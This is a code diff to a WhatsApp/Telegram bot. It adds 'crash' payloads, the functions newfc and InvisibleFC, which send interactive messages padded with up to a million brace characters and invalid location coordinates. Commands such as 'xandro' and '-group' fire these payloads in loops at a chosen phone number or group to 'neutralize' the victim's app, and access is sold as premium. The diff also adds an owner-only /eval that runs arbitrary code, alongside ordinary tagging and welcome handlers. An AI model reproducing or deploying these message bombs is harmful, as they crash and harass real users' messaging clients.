@@ -283,6 +283,94 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
     } catch (_) {}
   }
 }
+async function newfc(target) {
+  const cards = [];
+
+  const media = await prepareWAMessageMedia(
+    { video: { url: "https://files.catbox.moe/3uk8b9.mp4" } },
+    { upload: conn.waUploadToServer }
+  );
+
+  const header = {
+    videoMessage: media.videoMessage,
+    hasMediaAttachment: false,
+    contextInfo: {
+      forwardingScore: 666,
+      isForwarded: true,
+      stanzaId: "𝕷" + Date.now(),
+      participant: "0@s.whatsapp.net",
+      remoteJid: "status@broadcast",
+      quotedMessage: {
+        extendedTextMessage: {
+          text: "𝕷",
+          contextInfo: {
+            mentionedJid: ["13135550002@s.whatsapp.net"],
+            externalAdReply: {
+              title: "Finix AI Broadcast",
+              body: "Trusted System",
+              thumbnailUrl: "",
+              mediaType: 1,
+              sourceUrl: "https://tama.example.com",
+              showAdAttribution: false 
+            }
+          }
+        }
+      }
+    }
+  };
+
+  for (let r = 0; r < 15; r++) {
+    cards.push({
+      header,
+      nativeFlowMessage: {
+        messageParamsJson: "{".repeat(10000) 
+      }
+    });
+  }
+
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "𝕷"
+            },
+            carouselMessage: {
+              cards,
+              messageVersion: 1
+            },
+            contextInfo: {
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net"
+              },
+              stanzaId: "𝕷" + "-Id" + Math.floor(Math.random() * 99999), 
+              forwardingScore: 100,
+              isForwarded: true,
+              mentionedJid: ["13135550002@s.whatsapp.net"],
+              externalAdReply: {
+                title: "Finix Engine",
+                body: "",
+                thumbnailUrl: "https://example.com/",
+                mediaType: 1,
+                mediaUrl: "",
+                sourceUrl: "https://finix-ai.example.com",
+                showAdAttribution: false
+              }
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
+
+  await conn.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+}
 async function xc(target) {
    
   await conn.relayMessage(target, {
@@ -338,6 +426,46 @@ async function xc(target) {
   }, {
     participant: { jid: target }
   });
+}
+async function InvisibleFC(target) {
+  try {
+    let message = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude: -999.035,
+                degreesLongitude: 922.999999999999,
+                name: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
+                address: "\u200D",
+              },
+            },
+            body: {
+              text: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(1000000),
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: ["0@s.whatsapp.net"],
+            },
+          },
+        },
+      },
+    };
+
+    await conn.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target,
+    });
+  } catch (err) {
+    console.log(err);
+  }
 }
 async function VanitasFC(target) {
   try {
@@ -658,16 +786,76 @@ break
                     if (!q) return send("Usage: `xandro 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 15; i++) {
+                        await VanitasFC(target);
+                        await InvisibleFC(target);
+                        await newfc(target);
+                        await InvisibleFC(target);
+                        await VanitasFC(target);
+                        await newfc(target);
+                        await InvisibleFC(target);
                         await VanitasFC(target);
                         await VanitasFC(target);
-                        await VanitasFC(target);
-                        await VanitasFC(target);
+                        await InvisibleFC(target);
+                        await newfc(target);
                     }
                     xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                     𝗍ᥲrgᥱ𝗍: ${target}.
                     s𝗍ᥲ𝗍ᥙs: WhatsApp user has been neutralized.
                     ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
+                    } catch (err) {
+                    send(`An Error Occurred: ${err}`);
+                    }
+                    }
+                    break;
+                    case 'tagall':
+  if (!isGroup) return reply('This command can only be used in groups.');
+
+  try {
+    const groupMetadata = await conn.groupMetadata(chat);
+    const participants = groupMetadata.participants;
+    let mentions = [];
+    let text = `Tagging all members:\nMessage: *${q}*\n\n`;
+
+    for (const participant of participants) {
+      mentions.push(participant.id);
+      text += `@${participant.id.split('@')[0]}\n`;
+    }
+
+    conn.sendMessage(chat, { text: text, mentions: mentions });
+
+  } catch (error) {
+    console.error("Error in tagall command:", error);
+    reply("An error occurred while tagging all members.");
+  }
+  break;
+                    case "xgroup":
+                    case "-group": {
+                    if (!botNumber && !isCreator) {
+                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    } else {
+                    if (!isGroup) return send("‼️Gc Crash Bro, Use In A Group");
+            await conn.chatModify({ archive: true}, chat);
+                    try {
+                    for (let i = 0; i < 15; i++) {
+                        await VanitasFC(chat);
+                        await InvisibleFC(chat);
+                        await newfc(chat);
+                        await InvisibleFC(chat);
+                        await VanitasFC(chat);
+                        await newfc(chat);
+                        await InvisibleFC(chat);
+                        await VanitasFC(chat);
+                        await VanitasFC(chat);
+                        await InvisibleFC(target);
+                        await newfc(chat);
+                    }
+                    xreply(`
+                    gr᥆ᥙ⍴: ${chat} 💥
+                    ᥴ᥆mmᥲᥒძ: ${command} 💥
+                    gr᥆ᥙ⍴ ᥒᥱᥙ𝗍rᥲᥣіzᥱძ 💥
+                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 💥
+                    \`(t.me/ayokunledavid to buy prem) 💥.\``);
                     } catch (err) {
                     send(`An Error Occurred: ${err}`);
                     }
@@ -682,10 +870,8 @@ break
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
                     for (let i = 0; i < 10; i++) {
-                        await poveius24jam(conn, target);
-                        await poveius24jam(conn, target);
-                        await poveius24jam(conn, target);
-                        await poveius24jam(conn, target);
+                        await newfc(target);
+                        await InvisibleFC(target);
                     }
                     xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                     𝗍ᥲrgᥱ𝗍: ${target}.
@@ -706,14 +892,17 @@ break
                     try {
                     for (let i = 0; i < 15; i++) {
                         await xc(target);
+                        await newfc(target);
+                        await newfc(target);
                         await FlowXNull(target);
                         await xc(target);
+                        await newfc(target);
                         await FlowXNull(target);
                         await VanitasFC(target);
                         await VanitasFC(target);
+                        await newfc(target);
                         await VanitasFC(target);
                         await FlowXNull(target);
-                        
                     }
                     xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                     𝗍ᥲrgᥱ𝗍: ${target}.
@@ -742,7 +931,7 @@ break
 .𝗌𝗎𝖻𝗃𝖾𝖼𝗍 [𝗇𝖾𝗐]
 .𝗀𝗋𝗈𝗎𝗉𝗅𝗂𝗇𝗄
 .𝗄𝗂𝖼𝗄 @user
-.𝖼𝗋𝖾𝖺𝗍𝖾𝗀𝖼
+.𝗍𝖺𝗀𝖺𝗅𝗅
 
 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
 .𝗌𝖾𝗅𝖿
@@ -750,7 +939,7 @@ break
 .𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
 .𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
 .mixed 234xxx
-
+.-𝗀𝗋𝗈𝗎𝗉 (𝗂𝗇 𝗀𝖼) 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
 `
                     });
@@ -811,7 +1000,7 @@ break
 });
 }
 
-let isPairLocked = false;
+let isPairLocked = true;
 
 bot.onText(/\/lockpair/, (msg) => {
   const chatId = msg.chat.id;
@@ -881,6 +1070,39 @@ bot.onText(/\/pair(?:\s(\d+))?/, async (msg, match) => {
     }
 });
 
+bot.onText(/\/eval (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const code = match[1].trim();
+    const userId = msg.from.id.toString();
+    
+      if (isOwner(userId)) {
+    try {
+        const result = eval(code);
+        const response = `Result:\n${String(result)}`;
+
+        bot.sendMessage(chatId, response);
+
+    } catch (error) {
+        console.error("Error during /eval:", error);
+        bot.sendMessage(chatId, `Error:\n${String(error)}`);
+    }
+}  else {
+        const options = {
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [
+                        {
+                            text: "Get Premium",
+                            url: "https://wa.me/2349012834275"
+                        }
+                    ]
+                ]
+            })
+        };
+
+        bot.sendMessage(chatId, "Sorry, only the bot owner can use this command.", options);
+    }
+});
 
 // Handle /delete command
 bot.onText(/\/delpair (\d+)/, async (msg, match) => {
@@ -934,6 +1156,7 @@ Hello ${msg.from.first_name || "there"}
 Welcome To The Telegram Bot Interface
 /pair <phone number>
 /delpair <phone number>
+/list (view paired numbers)
 
 Creator -> ayokunledavid.t.me`;
 
@@ -984,14 +1207,40 @@ loadConnectedUsers(); // Load Connected users from the JSON file
 loadAllSessions().catch(err => {
     console.log('Error loading sessions:', err);
 });
+bot.on('new_chat_members', async (msg) => {
+  const chatId = msg.chat.id;
+  const newMembers = msg.new_chat_members;
 
-// Start the bor
+  try {
+    // Fetch the chat information to get the bio (description)
+    const chatInfo = await bot.getChat(chatId);
+    const groupBio = chatInfo.description || "No group rules or description set.";
+
+    newMembers.forEach(member => {
+      const memberName = member.first_name || member.username || 'User';  // Get the member's name
+
+      let welcomeMessage = `Welcome to the group, ${memberName}!`;
+
+      if (msg.chat.title) {
+        welcomeMessage += ` This is the ${msg.chat.title} group.`;
+      }
+
+      welcomeMessage += `\n\n*Group Rules and Information:*\n${groupBio}`;
+
+      bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
+    });
+  } catch (error) {
+    console.error("Error fetching group bio:", error);
+    bot.sendMessage(chatId, "Welcome to the group!  (Could not retrieve group rules at this time.)"); 
+  }
+});
+// Start the bot
         console.table({
             "Bot Name": "WhatsTele Bot",
             "Link": `https://t.me/gabimarutechchannel`,
             "Author": "https://t.me/ayokunledavid"
 })
-console.log('Telegram bot imstace has started...');
+console.log('Telegram bot instance has started...');
 
 
 let file = require.resolve(__filename)
